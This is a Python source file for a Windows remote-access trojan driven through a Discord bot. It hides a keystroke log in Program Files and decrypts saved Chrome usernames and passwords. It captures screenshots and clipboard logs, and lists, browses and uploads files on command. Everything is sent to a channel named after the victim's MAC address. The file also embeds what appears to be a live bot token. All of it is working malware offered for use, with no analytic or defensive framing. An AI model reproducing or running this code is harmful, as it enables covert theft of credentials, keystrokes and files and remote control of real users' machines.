import pyautogui
import keyboard
import uuid
import discord
from discord.ext import commands
import subprocess
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import ctypes
from datetime import timezone, datetime, timedelta

def on_key_event(e):
    with open("c:/Program Files/default.ini", "a") as file:
        if e.name in ['shift', 'ctrl', 'alt', 'esc', 'enter', 'backspace']:
            file.write(f" {e.name}")
        else:
            file.write(f" {e.name}")
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW("c:/Program Files/default.ini", FILE_ATTRIBUTE_HIDDEN)

intents = discord.Intents.default()
intents.message_content = True  # Enables bot to read message content
intents.guilds = True  # Enables bot to manage guilds (servers)

# Create a bot instance with the specified intents
bot = commands.Bot(command_prefix="", intents=intents)

mac = ''.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join("C:/Users/Administrator",
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
def get_password(user, profile):
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(f"C:/Users/{user}", "AppData", "Local",
                            "Google", "Chrome", "User Data", profile, "Login Data")
    result = ""
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    try:
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                result  = result + f"Origin URL: {origin_url}\n"
                result  = result + f"Action URL: {action_url}\n"
                result  = result + f"Username: {username}\n"
                result  = result + f"Password: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                result  = result + f"Creation date: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                result  = result + f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
            result  = result + ("="*50)
            result = result + "\n\n"
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
        with open("gmail.txt", "a") as file:
            file.write(result)
    except FileNotFoundError:
        print("file doesn't exist")
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    guild = discord.utils.get(bot.guilds, name="Remotasks server")  # Replace with your server's name

    script_location = os.path.abspath(__file__)
    script_directory = os.path.dirname(script_location)
    os.chdir(script_directory)
    
    if guild:
        channel_name = mac  # Name of the channel you want to create

        # Check if the channel already exists
        existing_channel = discord.utils.get(guild.channels, name=channel_name)
        if not existing_channel:
            # Create the text channel
            new_channel = await guild.create_text_channel(channel_name)
            print(f'Channel "{channel_name}" created successfully!')
        else:
            print(f'Channel "{channel_name}" already exists.')
            
@bot.command()
async def screenshot(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    screenshot = pyautogui.screenshot()

    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        await ctx.send("Here is screenshot:", file=discord.File(f))

@bot.command()
async def key(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    with open("c:/Program Files/default.ini", "rb") as f:
        await ctx.send("Here is key events:", file=discord.File(f))
    with open('c:/Program Files/default.ini', 'w') as file:
        # No need to write anything, opening in 'w' mode clears the file
        pass
    
@bot.command()
async def clipboard(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    with open("clipboard.txt", "rb") as f:
        await ctx.send("Here is clipboard events:", file=discord.File(f))
    with open('clipboard.txt', 'w') as file:
        # No need to write anything, opening in 'w' mode clears the file
        pass

@bot.command()
async def location(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    script_location = os.path.abspath(__file__)
    await ctx.send(f'current location : "{script_location}"')
    
@bot.command()
async def ls(ctx):
    channel = ctx.channel
    if mac != channel.name:
        return
    result = subprocess.run('dir', shell=True, capture_output=True, text=True)

    print(result.stdout)
    await ctx.send(f'"{result.stdout}"')
    
@bot.command()
async def cd(ctx, *, path: str):
    channel = ctx.channel
    if mac != channel.name:
        return
    try:
        # Attempt to change the directory
        os.chdir(path)
        # Get the new current working directory
        new_directory = os.getcwd()
        await ctx.send(f"Directory changed to: {new_directory}")
    except FileNotFoundError:
        await ctx.send(f"Error: Directory '{path}' not found.")
    except NotADirectoryError:
        await ctx.send(f"Error: '{path}' is not a directory.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def upload(ctx, *, file_path: str):
    channel = ctx.channel
    if mac != channel.name:
        return
    if not os.path.isfile(file_path):
        await ctx.send(f"Error: File '{file_path}' not found.")
        return

    try:
        # Create a Discord File object and send it
        with open(file_path, 'rb') as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
@bot.command()
async def gmail(ctx, *, param: str):
    user, profile = param.split(' ', 1)

    channel = ctx.channel
    if mac != channel.name:
        return
    get_password(user, profile)
    with open("gmail.txt", "rb") as f:
        await ctx.send("Here is gmail infos:", file=discord.File(f))
    with open('gmail.txt', 'w') as file:
        # No need to write anything, opening in 'w' mode clears the file
        pass
        

keyboard.on_press(on_key_event)    
    
bot.run('MTI3NjIwODYwOTQwNzAxMjk1NQ.GL50-m.3nLBbHr39A1xoLpRtJMAOwBM8Jz2oW8Dv_HCMU')